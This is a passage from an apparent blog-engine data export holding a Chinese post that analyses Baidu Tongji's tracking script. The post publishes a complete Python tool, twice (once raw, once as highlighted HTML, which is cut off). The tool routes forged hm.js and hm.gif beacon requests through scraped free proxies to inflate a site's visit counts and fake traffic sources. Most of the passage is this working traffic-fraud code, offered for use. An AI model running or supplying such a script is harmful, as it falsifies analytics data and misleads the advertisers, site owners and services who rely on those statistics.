sys.exit()\n\n    def run_Threads(self):\n        thread_arr=[]       # 线程列表list\n        for i in range(self.vistiThread):\n            t = threading.Thread(target=self.doCheat)\n            thread_arr.append(t)\n        for i in range(self.vistiThread):\n            thread_arr[i].start()\n        for i in range(self.vistiThread):\n            thread_arr[i].join()\n\n        print(\"Job Finish!!!  %d \"%self.counter)   \n\n\n    def doCheat(self):\n        while self.counter<self.visitCount:  \n            print(\".\",end=\"\")\n            proxy=self.proxyer.getAProxy()\n            try:\n                proxy=re.match(r'(https?\\:\\/\\/(\\d+\\.){3}\\d+\\:\\d+)',proxy).group(1)  # 正则表达式校验proxy\n            except:\n                print(\"proxy正则校验失败...\")\n                continue\n\n            protocol=proxy.split(\"://\")[0]\n            headers={\n                    'Connection': 'close',\n                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',\n                    'Accept': '*/*',\n                    'Accept-Language': 'zh-CN,zh;q=0.8,en;q=0.6',\n                    'Referer': self.pageUrl\n            }\n\n            try:\n                s=\"\"\n                s=requests.session()\n                # 访问hm.js?{ID}获取cookie\n                s.get(\"https://hm.baidu.com/hm.js?\"+self.bdTongJiID,headers=headers,proxies={protocol:proxy},verify=False,timeout=15)\n                # 直接访问1 | 站外跳入1\n                params={\n                        'cc':'0',\n                        'ck':'1',\n                        'cl':'24-bit',\n                        'ds':'1280x800',\n                        'et':'0',\n                        'fl':'26',\n                        'ja':'0',\n                        'ln':'zh-cn',\n                        'lo':'0',\n                        'lt':str(int(time.time())-2),     \n                        'nv':str( 0 if (self.sourceUrl is None) else 1),\n                        'rnd':str(random.randint(0,2147483647)),\n                        'si':str(self.bdTongJiID),\n                        'st':str( 4 if (self.sourceUrl is None) else 1),\n                        #'su':str( self.sourceUrl if（self.sourceUrl is not None) else \"\" ),\n                        'v':'1.2.16',\n                        'lv':'3',\n                        'sn':str(int(time.time())%65535),\n                        'ct':'!!',\n                        'tt':self.pageTitle\n                }\n                if self.sourceUrl is not None:\n                    params['su']=self.sourceUrl\n                # 第一次提交数据\n                r=s.get(\"http://hm.baidu.com/hm.gif\",headers=headers,params=params,proxies={protocol:proxy},verify=False,timeout=5)\n                logging.info(r.url)\n                time.sleep(1)\n                # 直接访问2 | 站外跳入2\n                params['et']='87'\n                params['rnd']=str(random.randint(0,2147483647))\n                params.pop('sn')    # 移除 sn\n                params.pop('ct')    # 移除 ct\n                params.pop('tt')    # 移除 tt\n                ep={\n                    'netAll':random.randint(5,500),\n                    'netDns':0,\n                    'netTcp':0,\n                    'srv':random.randint(5,200),\n                    'dom':random.randint(250,750),\n                    'loadEvent':random.randint(800,1500),\n                    'qid':\"\",\n                    'bdDom':0,\n                    'bdRun':0,\n                    'bdDef':0\n                }\n\n                ep= '{\"netAll\":'+ str(random.randint(5,500)) + ',\"netDns\":0' + ',\"netTcp\":0' + ',\"srv\":' + str(random.randint(5,200)) +   ',\"dom\":' + str(random.randint(250,750))+',\"loadEvent\":' + str(random.randint(800,1500))+',\"qid\":\"\",\"bdDom\":0,\"bdRun\":0,\"bdDef\":0}'\n\n                params['ep']=str(ep)     # 顺序变乱，尚不清楚是否影响使用\n                # 第二次提交数据\n                r=s.get(\"http://hm.baidu.com/hm.gif\",headers=headers,params=params,proxies={protocol:proxy},verify=False,timeout=5)\n                logging.info(r.url)\n                self.threadLock.acquire()\n                self.counter = self.counter + 1\n                print(\"\\rSuccess %d times\"%self.counter)\n                self.threadLock.release()\n            except:\n                #print(\"Failed! Do again...\")\n                print(\".\",end=\"\")\n            finally:\n                pass     \n\n            time.sleep(1)\n\ndef main():\n    headCharPic=\"\\r        .--.\\n       |o_o |    ------------------ \\n       |:_/ |   < Author: Mr.Bingo >\\n      //   \\ \\   ------------------ \\n     (|     | ) <    oddboy.cn     >\\n    /'\\_   _/`\\  ------------------\\n    \\___)=(___/\\n\"\n    print(headCharPic)\n    # Creating a parser\n    parser=argparse.ArgumentParser(\n        #prog=\"BingoBF\",\n        usage=\"%(prog)s [options] \",\n        description='刷百度统计访问数据',\n        epilog=\"+---+\\n\"\n        )\n    parser = argparse.ArgumentParser()\n\n    parser.add_argument(\"-u\",dest=\"url\",action=\"store\",required=True,help=\"目标URL，HM_ID从网页中提取\")\n\n    parser.add_argument(\"--proxyList\",dest=\"proxyList\",action=\"store\",default=None,help=\"代理地址列表文件，格式： http://127.0.0.1:8080 ; 如空，则自动从xicidaili.com/nn上爬取。\")\n\n    parser.add_argument(\"-s\",dest=\"source\",action=\"store\",default=None,help=\"流量来源地址\")\n\n    parser.add_argument(\"-c\",dest=\"count\",action=\"store\",default=10, type=int , help=\"访问次数 (目前只实现单一网页,单次访问统计),默认10次\")\n\n    parser.add_argument(\"-t\",dest=\"threads\",action=\"store\",default=1,type=int,help=\"线程数，默认为1\")\n\n    args=parser.parse_args()\n\n    proxy_obj=Proxyer(args.proxyList)   # 生成一个Proxyer对象\n    cheater_obj = Cheater(proxy_obj,args.url,args.source,args.threads,args.count)   # 生成一个Cheater对象\n\n    cheater_obj.run_Threads()\n\nif __name__ == '__main__':\n    main()\n```\n\n","slug":"百度统计JS脚本分析-流量伪造脚本","published":1,"updated":"2017-09-08T10:06:49.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj9qrjft1000y97uvf2u5bby2","content":"<blockquote>\n<p>  花了两天时间，终于把百度统计的js代码大概看了看，并写了个刷流量的Python脚本。 </p>\n</blockquote>\n<a id=\"more\"></a>\n<h3 id=\"实现原理\"><a href=\"#实现原理\" class=\"headerlink\" title=\"实现原理\"></a>实现原理</h3><p>百度统计网站 <a href=\"https://tongji.baidu.com\" target=\"_blank\" rel=\"external\">https://tongji.baidu.com</a></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;script&gt;</div><div class=\"line\"><span class=\"keyword\">var</span> _hmt = _hmt || [];</div><div class=\"line\">(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</div><div class=\"line\">\t<span class=\"keyword\">var</span> hm = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"script\"</span>);</div><div class=\"line\">\thm.src = <span class=\"string\">\"https://hm.baidu.com/hm.js?789fd650fa0xxxxxxxxxxxx9d890b87f\"</span>;</div><div class=\"line\">\t<span class=\"keyword\">var</span> s = <span class=\"built_in\">document</span>.getElementsByTagName(<span class=\"string\">\"script\"</span>)[<span class=\"number\">0</span>]; </div><div class=\"line\">\ts.parentNode.insertBefore(hm, s);</div><div class=\"line\">\t&#125;)();</div><div class=\"line\"><span class=\"xml\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span></div></pre></td></tr></table></figure>\n<ol>\n<li><p>在需要统计的页面加入上面的代码，引入hm.js脚本。</p>\n</li>\n<li><p>在获取该hm.js代码的同时，百度统计会往你的浏览器写入一个名字为“HMACCOUNT”的cookie，每一个cookie即为一个客户标识。（同IP不同用户的情况很常见，所以访问量不可能以IP为准）</p>\n</li>\n<li><p>hm.js脚本执行，获取一些浏览器/网页/访问来源等一系列信息，包括屏幕尺寸、颜色深度、flash版本、用户语言等。</p>\n</li>\n</ol>\n<h3 id=\"参数分析\"><a href=\"#参数分析\" class=\"headerlink\" title=\"参数分析\"></a>参数分析</h3><p>从js代码中可以得知，所有的参数包括“cc cf ci ck cl cm cp cu cw ds ep et fl ja ln lo lt nv rnd si st su v cv lv api sn ct u tt”。</p>\n<p>经过吐血分析，大致的作用如下，以及一些实际示例（由于直接张贴有些乱，所以就贴图了。）<br><img src=\"/2017/09/百度统计JS脚本分析-流量伪造脚本/image01.jpg\" alt=\"img\"></p>\n<h3 id=\"python脚本实现\"><a href=\"#python脚本实现\" class=\"headerlink\" title=\"python脚本实现\"></a>python脚本实现</h3><p>主要思路：</p>\n<ol>\n<li><p>访问目标url,获取标题和页面中的百度统计id。</p>\n</li>\n<li><p>从西刺代理获取免费代理。</p>\n</li>\n<li><p>访问hm.js获取cookie。</p>\n</li>\n<li><p>提交两次略有差异的GET请求到hm.gif</p>\n</li>\n</ol>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div><div class=\"line\">95</div><div class=\"line\">96</div><div class=\"line\">97</div><div class=\"line\">98</div><div class=\"line\">99</div><div class=\"line\">100</div><div class=\"line\">101</div><div class=\"line\">102</div><div class=\"line\">103</div><div class=\"line\">104</div><div class=\"line\">105</div><div class=\"line\">106</div><div class=\"line\">107</div><div class=\"line\">108</div><div class=\"line\">109</div><div class=\"line\">110</div><div class=\"line\">111</div><div class=\"line\">112</div><div class=\"line\">113</div><div class=\"line\">114</div><div class=\"line\">115</div><div class=\"line\">116</div><div class=\"line\">117</div><div class=\"line\">118</div><div class=\"line\">119</div><div class=\"line\">120</div><div class=\"line\">121</div><div class=\"line\">122</div><div class=\"line\">123</div><div class=\"line\">124</div><div class=\"line\">125</div><div class=\"line\">126</div><div class=\"line\">127</div><div class=\"line\">128</div><div class=\"line\">129</div><div class=\"line\">130</div><div class=\"line\">131</div><div class=\"line\">132</div><div class=\"line\">133</div><div class=\"line\">134</div><div class=\"line\">135</div><div class=\"line\">136</div><div class=\"line\">137</div><div class=\"line\">138</div><div class=\"line\">139</div><div class=\"line\">140</div><div class=\"line\">141</div><div class=\"line\">142</div><div class=\"line\">143</div><div class=\"line\">144</div><div class=\"line\">145</div><div class=\"line\">146</div><div class=\"line\">147</div><div class=\"line\">148</div><div class=\"line\">149</div><div class=\"line\">150</div><div class=\"line\">151</div><div class=\"line\">152</div><div class=\"line\">153</div><div class=\"line\">154</div><div class=\"line\">155</div><div class=\"line\">156</div><div class=\"line\">157</div><div class=\"line\">158</div><div class=\"line\">159</div><div class=\"line\">160</div><div class=\"line\">161</div><div class=\"line\">162</div><div class=\"line\">163</div><div class=\"line\">164</div><div class=\"line\">165</div><div class=\"line\">166</div><div class=\"line\">167</div><div class=\"line\">168</div><div class=\"line\">169</div><div class=\"line\">170</div><div class=\"line\">171</div><div class=\"line\">172</div><div class=\"line\">173</div><div class=\"line\">174</div><div class=\"line\">175</div><div class=\"line\">176</div><div class=\"line\">177</div><div class=\"line\">178</div><div class=\"line\">179</div><div class=\"line\">180</div><div class=\"line\">181</div><div class=\"line\">182</div><div class=\"line\">183</div><div class=\"line\">184</div><div class=\"line\">185</div><div class=\"line\">186</div><div class=\"line\">187</div><div class=\"line\">188</div><div class=\"line\">189</div><div class=\"line\">190</div><div class=\"line\">191</div><div class=\"line\">192</div><div class=\"line\">193</div><div class=\"line\">194</div><div class=\"line\">195</div><div class=\"line\">196</div><div class=\"line\">197</div><div class=\"line\">198</div><div class=\"line\">199</div><div class=\"line\">200</div><div class=\"line\">201</div><div class=\"line\">202</div><div class=\"line\">203</div><div class=\"line\">204</div><div class=\"line\">205</div><div class=\"line\">206</div><div class=\"line\">207</div><div class=\"line\">208</div><div class=\"line\">209</div><div class=\"line\">210</div><div class=\"line\">211</div><div class=\"line\">212</div><div class=\"line\">213</div><div class=\"line\">214</div><div class=\"line\">215</div><div class=\"line\">216</div><div class=\"line\">217</div><div class=\"line\">218</div><div class=\"line\">219</div><div class=\"line\">220</div><div class=\"line\">221</div><div class=\"line\">222</div><div class=\"line\">223</div><div class=\"line\">224</div><div class=\"line\">225</div><div class=\"line\">226</div><div class=\"line\">227</div><div class=\"line\">228</div><div class=\"line\">229</div><div class=\"line\">230</div><div class=\"line\">231</div><div class=\"line\">232</div><div class=\"line\">233</div><div class=\"line\">234</div><div class=\"line\">235</div><div class=\"line\">236</div><div class=\"line\">237</div><div class=\"line\">238</div><div class=\"line\">239</div><div class=\"line\">240</div><div class=\"line\">241</div><div class=\"line\">242</div><div class=\"line\">243</div><div class=\"line\">244</div><div class=\"line\">245</div><div class=\"line\">246</div><div class=\"line\">247</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#! /usr/bin/env python3</span></div><div class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">import</span> requests</div><div class=\"line\"><span class=\"keyword\">from</span> bs4 <span class=\"keyword\">import</span> BeautifulSoup</div><div class=\"line\"><span class=\"keyword\">import</span> argparse</div><div class=\"line\"><span class=\"keyword\">import</span> os</div><div class=\"line\"><span class=\"keyword\">import</span> sys</div><div class=\"line\"><span class=\"keyword\">import</span> re</div><div class=\"line\"><span class=\"keyword\">import</span> queue</div><div class=\"line\"><span class=\"keyword\">import</span> threading</div><div class=\"line\"><span class=\"keyword\">import</span> time</div><div class=\"line\"><span class=\"keyword\">import</span> logging</div><div class=\"line\"><span class=\"keyword\">import</span> random</div><div class=\"line\"><span class=\"keyword\">from</span> requests.packages.urllib3.exceptions <span class=\"keyword\">import</span> InsecureRequestWarning</div><div class=\"line\">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</div><div class=\"line\"></div><div class=\"line\">logging.basicConfig(level=logging.WARNING)</div><div class=\"line\"></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Proxyer</span><span class=\"params\">(object)</span>:</span></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self,proxyListFile=None)</span>:</span></div><div class=\"line\">        self.proxyListFile = proxyListFile</div><div class=\"line\">        self.proxyList = queue.Queue()      <span class=\"comment\"># proxy队列</span></div><div class=\"line\">        self.xici_url=<span class=\"string\">'http://www.xicidaili.com/nn/'</span></div><div class=\"line\">        self.xici_pageid=<span class=\"number\">0</span>                  <span class=\"comment\"># http://www.xicidaili.com/nn/&#123;id&#125;</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">readFromFile</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"keyword\">with</span> open(self.proxyListFile, <span class=\"string\">'r'</span>) <span class=\"keyword\">as</span> f:</div><div class=\"line\">            <span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> f.readlines():</div><div class=\"line\">                self.proxyList.put(str.lower(line).strip(<span class=\"string\">\"\\n\"</span>))</div><div class=\"line\">        <span class=\"keyword\">return</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">readFrom_xicidaili</span><span class=\"params\">(self)</span>:</span>   </div><div class=\"line\">        self.xici_pageid = self.xici_pageid + <span class=\"number\">1</span> <span class=\"keyword\">if</span> self.xici_pageid&lt;<span class=\"number\">500</span> <span class=\"keyword\">else</span> <span class=\"number\">1</span>      <span class=\"comment\"># 只读取前500个页面中的代理。</span></div><div class=\"line\">        page_url = self.xici_url + str(self.xici_pageid) </div><div class=\"line\">        print(<span class=\"string\">\"Read Proxies From :: %s\"</span>%page_url)</div><div class=\"line\">        ipPool=[]</div><div class=\"line\">        headers=&#123;</div><div class=\"line\">        <span class=\"string\">'Connection'</span>: <span class=\"string\">'close'</span>,</div><div class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36'</span>,</div><div class=\"line\">        <span class=\"string\">'Accept'</span>: <span class=\"string\">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'</span>,</div><div class=\"line\">        <span class=\"string\">'Accept-Language'</span>: <span class=\"string\">'zh-CN,zh;q=0.8,en;q=0.6'</span>,</div><div class=\"line\">        &#125;</div><div class=\"line\">        <span class=\"comment\"># Make a GET request and read the response</span></div><div class=\"line\">        req = requests.get(page_url,headers=headers)</div><div class=\"line\"></div><div class=\"line\">        html_str=req.text</div><div class=\"line\">        <span class=\"comment\"># the pattern(Regular expression) is depend on the response data from your url</span></div><div class=\"line\">        pattern = <span class=\"string\">r'\\s*&lt;tr[\\s\\S]*?&lt;td&gt;(((2[0-4]\\d|25[0-5]|[01]?\\d\\d?)\\.)&#123;3&#125;(2[0-4]\\d|25[0-5]|[01]?\\d\\d?))&lt;/td&gt;\\s*?&lt;td&gt;(\\d*?)&lt;/td&gt;[\\s\\S]*?&lt;a[\\s\\S]*?&gt;(.*?)&lt;/a&gt;[\\s\\S]*?&lt;td&gt;(HTTP|HTTPS)&lt;/td&gt;'</span></div><div class=\"line\">        regex = re.compile(pattern)</div><div class=\"line\">        s = regex.findall(html_str)</div><div class=\"line\">        <span class=\"comment\">#s = [('221.204.103.145', '103.', '103', '145', '9797', '山西太原', 'HTTP'), ...]</span></div><div class=\"line\">        <span class=\"keyword\">for</span> host <span class=\"keyword\">in</span> s:</div><div class=\"line\">            hostdict = (host[<span class=\"number\">0</span>],host[<span class=\"number\">4</span>],host[<span class=\"number\">5</span>],host[<span class=\"number\">-1</span>])</div><div class=\"line\">            ipPool.append(hostdict)</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> ipPool:</div><div class=\"line\">            self.proxyList.put(str.lower(<span class=\"string\">'%s://%s:%s'</span>% (x[<span class=\"number\">3</span>], x[<span class=\"number\">0</span>],x[<span class=\"number\">1</span>])))</div><div class=\"line\">        <span class=\"keyword\">return</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getAProxy</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        logging.info(<span class=\"string\">\"tring get a proxy...\"</span>)</div><div class=\"line\">        proxy = <span class=\"string\">\"\"</span></div><div class=\"line\">        <span class=\"keyword\">try</span>:</div><div class=\"line\">            proxy = self.proxyList.get(timeout=<span class=\"number\">1</span>)</div><div class=\"line\">        <span class=\"keyword\">except</span>:</div><div class=\"line\">            <span class=\"keyword\">if</span> (self.proxyList.empty):</div><div class=\"line\">                <span class=\"keyword\">if</span> self.proxyListFile <span class=\"keyword\">is</span> <span class=\"keyword\">None</span> :</div><div class=\"line\">                    self.readFrom_xicidaili()</div><div class=\"line\">                <span class=\"keyword\">else</span>:</div><div class=\"line\">                    self.readFromFile()      <span class=\"comment\"># 读取一次用完后，再次读取。</span></div><div class=\"line\">            proxy = self.proxyList.get()</div><div class=\"line\">        <span class=\"keyword\">return</span> proxy</div><div class=\"line\"></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Cheater</span><span class=\"params\">(object)</span>:</span></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self,proxy_obj,url,source,vistiThread,visitCount)</span>:</span></div><div class=\"line\">        self.proxyer=proxy_obj</div><div class=\"line\">        self.sourceUrl=source</div><div class=\"line\">        self.visitCount=visitCount</div><div class=\"line\">        self.vistiThread=vistiThread</div><div class=\"line\">        self.counter=<span class=\"number\">0</span>      <span class=\"comment\"># 已完成的访问数</span></div><div class=\"line\">        self.threadLock = threading.Lock()      <span class=\"comment\"># 用于计数器</span></div><div class=\"line\">        self.pageUrl=<span class=\"string\">\"\"</span></div><div class=\"line\">        self.pageTitle=<span class=\"string\">\"\"</span></div><div class=\"line\">        self.bdTongJiID=<span class=\"string\">\"\"</span></div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">try</span>:</div><div class=\"line\">            r = requests.get(url)</div><div class=\"line\">            self.pageUrl = r.url</div><div class=\"line\">            print(<span class=\"string\">\"当前页面URL :: \"</span>,self.pageUrl)</div><div class=\"line\">            </div><div class=\"line\">            soup = BeautifulSoup(r.text, <span class=\"string\">'lxml'</span>)</div><div class=\"line\">            html_str=soup.prettify()</div><div class=\"line\"></div><div class=\"line\">            self.pageTitle=soup.title.string</div><div class=\"line\"></div><div class=\"line\">            print(<span class=\"string\">\"当前页面标题 :: \"</span>, self.pageTitle)</div><div class=\"line\">        <span class=\"keyword\">except</span>:</div><div class=\"line\">            print(<span class=\"string\">\"目标网页读取失败！！！\"</span>)</div><div class=\"line\">            sys.exit()</div><div class=\"line\">            </div><div class=\"line\">        <span class=\"keyword\">try</span>:</div><div class=\"line\"></div><div class=\"line\">            self.bdTongJiID=re.search(<span class=\"string\">r'hm.src = \"https?\\:\\/\\/hm.baidu.com\\/hm.js\\?(\\w&#123;32&#125;)\";'</span>,html_str,re.I).group(<span class=\"number\">1</span>)   <span class=\"comment\"># 正则表达式提取32位字符串id</span></div><div class=\"line\">            print(<span class=\"string\">\"获得百度统计代码ID :: \"</span>,self.bdTongJiID)</div><div class=\"line\">            <span class=\"keyword\">if</span> len(self.bdTongJiID)!=<span class=\"number\">32</span> :</div><div class=\"line\">                print(<span class=\"string\">\"百度统计ID异常\"</span>)</div><div class=\"line\">                sys.exit()</div><div class=\"line\">        <span class=\"keyword\">except</span>:</div><div class=\"line\">            print(<span class=\"string\">\"目标网页未引用百度统计js代码\"</span>)</div><div class=\"line\">            sys.exit()</div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run_Threads</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        thread_arr=[]       <span class=\"comment\"># 线程列表list</span></div><div class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(self.vistiThread):</div><div class=\"line\">            t = threading.Thread(target=self.doCheat)</div><div class=\"line\">            thread_arr.append(t)</div><div class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(self.vistiThread):</div><div class=\"line\">            thread_arr[i].start()</div><div class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(self.vistiThread):</div><div class=\"line\">            thread_arr[i].join()</div><div class=\"line\"></div><div class=\"line\">        print(<span class=\"string\">\"Job Finish!!!  %d \"</span>%self.counter)   </div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">doCheat</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"keyword\">while</span> self.counter&lt;self.visitCount:  </div><div class=\"line\">            print(<span class=\"string\">\".\"</span>,end=<span class=\"string\">\"\"</span>)</div><div class=\"line\">            proxy=self.proxyer.getAProxy()</div><div class=\"line\">            <span class=\"keyword\">try</span>:</div><div class=\"line\">                proxy=re.match(<span class=\"string\">r'(https?\\:\\/\\/(\\d+\\.)&#123;3&#125;\\d+\\:\\d+)'</span>,proxy).group(<span class=\"number\">1</span>)  <span class=\"comment\"># 正则表达式校验proxy</span></div><div class=\"line\">            <span class=\"keyword\">except</span>:</div><div class=\"line\">                print(<span class=\"string\">\"proxy正则校验失败...\"</span>)</div><div class=\"line\">                <span class=\"keyword\">continue</span></div><div class=\"line\"></div><div class=\"line\">            protocol=proxy.split(<span class=\"string\">\"://\"</span>)[<span class=\"number\">0</span>]</div><div class=\"line\">            headers=&#123;</div><div class=\"line\">                    <span class=\"string\">'Connection'</span>: <span class=\"string\">'close'</span>,</div><div class=\"line\">                    <span class=\"string\">'User-Agent'</span>: <span class=\"string\">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36'</span>,</div><div class=\"line\">                    <span class=\"string\">'Accept'</span>: <span class=\"string\">'*/*'</span>,</div><div class=\"line\">                    <span class=\"string\">'Accept-Language'</span>: <span class=\"string\">'zh-CN,zh;q=0.8,en;q=0.6'</span>,</div><div class=\"line\">                    <span class=\"string\">'Referer'</span>: self.pageUrl</div><div class=\"line\">            &#125;</div><div class=\"line\"></div><div class=\"line\">            <span class=\"keyword\">try</span>:</div><div class=\"line\">                s=<span class=\"string\">\"\"</span></div><div class=\"line\">                s=requests.session()</div><div class=\"line\">                <span class=\"comment\"># 访问hm.js?&#123;ID&#125;获取cookie</span></div><div class=\"line\">                s.get(<span class=\"string\">\"https://hm.baidu.com/hm.js?\"</span>+self.bdTongJiID,headers=headers,proxies=&#123;protocol:proxy&#125;,verify=<span class=\"keyword\">False</span>,timeout=<span class=\"number\">15</span>)</div><div class=\"line\">                <span class=\"comment\"># 直接访问1 | 站外跳入1</span></div><div class=\"line\">                params=&#123;</div><div class=\"line\">                        <span class=\"string\">'cc'</span>:<span class=\"string\">'0'</span>,</div><div class=\"line\">                        <span class=\"string\">'ck'</span>:<span class=\"string\">'1'</span>,</div><div class=\"line\">                        <span class=\"string\">'cl'</span>:<span class=\"string\">'24-bit'</span>,</div><div class=\"line\">                        <span class=\"string\">'ds'</span>:<span class=\"string\">'1280x800'</span>,</div><div class=\"line\">                        <span class=\"string\">'et'</span>:<span class=\"string\">'0'</span>,</div><div class=\"line\">                        <span class=\"string\">'fl'</span>:<span class=\"string\">'26'</span>,</div><div class=\"line\">                        <span class=\"string\">'ja'</span>:<span class=\"string\">'0'</span>,</div><div class=\"line\">                        <span class=\"string\">'ln'</span>:<span class=\"string\">'zh-cn'</span>,</div><div class=\"line\">                        <span class=\"string\">'lo'</span>:<span class=\"string\">'0'</span>,</div><div class=\"line\">                        <span class=\"string\">'lt'</span>:str(int(time.time())<span class=\"number\">-2</span>),     </div><div class=\"line\">                        <span class=\"string\">'nv'</span>:str( <span class=\"number\">0</span> <span class=\"keyword\">if</span> (self.sourceUrl <span class=\"keyword\">is</span> <span class=\"keyword\">None</span>) <span class=\"keyword\">else</span> <span class=\"number\">1</span>),</div><div class=\"line\">                        <span class=\"string\">'rnd'</span>:str(random.randint(<span class=\"number\">0</span>,<span class=\"number\">2147483647</span>)),</div><div class=\"line\">                        <span class=\"string\">'si'</span>:str(self.bdTongJiID),</div><div class=\"line\">                        <span class=\"string\">'st'</span>:str( <span class=\"number\">4</span> <span class=\"keyword\">if</span> (self.sourceUrl <span class=\"keyword\">is</span> <span class=\"keyword\">None</span>) <span class=\"keyword\">else</span> <span class=\"number\">1</span>),</div><div class=\"line\">                        <span class=\"comment\">#'su':str( self.sourceUrl if（self.sourceUrl is not None) else \"\" ),</span></div><div class=\"line\">                        <span class=\"string\">'v'</span>:<span class=\"string\">'1.2.16'</span>,</div><div class=\"line\">                        <span class=\"string\">'lv'</span>:<span class=\"string\">'3'</span>,</div><div class=\"line\">                        <span class=\"string\">'sn'</span>:str(int(time.time())%<span class=\"number\">65535</span>),</div><div class=\"line\">                        <span class=\"string\">'ct'</span>:<span class=\"string\">'!!'</span>,</div><div class=\"line\">                        <span class=\"string\">'tt'</span>:self.pageTitle</div><div class=\"line\">                &#125;</div><div class=\"line\">                <span class=\"keyword\">if</span> self.sourceUrl <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> <span class=\"keyword\">None</span>:</div><div class=\"line\">                    params[<span class=\"string\">'su'</span>]=self.sourceUrl</div><div class=\"line\">                <span class=\"comment\"># 第一次提交数据</span></div><div class=\"line\">                r=s.get(<span class=\"string\">\"http://hm.baidu.com/hm.gif\"</span>,headers=headers,params=params,proxies=&#123;protocol:proxy&#125;,verify=<span class=\"keyword\">False</span>,timeout=<span class=\"number\">5</span>)</div><div class=\"line\">                logging.info(r.url)</div><div class=\"line\">                time.sleep(<span class=\"number\">1</span>)</div><div class=\"line\">                <span class=\"comment\"># 直接访问2 | 站外跳入2</span></div><div class=\"line\">                params[<span class=\"string\">'et'</span>]=<span 